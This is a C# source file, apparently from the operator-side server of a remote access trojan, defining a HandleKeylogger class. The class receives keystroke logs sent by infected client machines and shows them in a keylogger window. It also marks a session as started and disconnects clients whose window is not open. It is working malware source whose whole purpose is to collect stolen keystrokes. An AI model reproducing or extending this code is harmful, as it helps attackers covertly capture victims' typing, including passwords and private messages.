using Server.Forms;
using Server.MessagePack;
using Server.Connection;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace Server.Handle_Packet
{
    class HandleKeylogger
    {
        public HandleKeylogger(Clients client, MsgPack unpack_msgpack)
        {
            switch (unpack_msgpack.ForcePathObject("Command").AsString)
            {
                case "logs":
                    {
                        FormKeylogger KL = (FormKeylogger)Application.OpenForms["keyLogger:" + unpack_msgpack.ForcePathObject("ID").GetAsString()];
                        if (KL != null)
                        {
                            KL.Sb.Append(unpack_msgpack.ForcePathObject("Log").GetAsString());
                            KL.richTextBox1.Text = KL.Sb.ToString();
                            KL.richTextBox1.SelectionStart = KL.richTextBox1.TextLength;
                            KL.richTextBox1.ScrollToCaret();
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }

                case "started":
                    {
                        FormKeylogger KL = (FormKeylogger)Application.OpenForms["keyLogger:" + unpack_msgpack.ForcePathObject("ID").GetAsString()];
                        if (KL != null)
                        {
                            KL.Client = client;
                            KL.timer1.Start();
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
            }
        }
    }
}
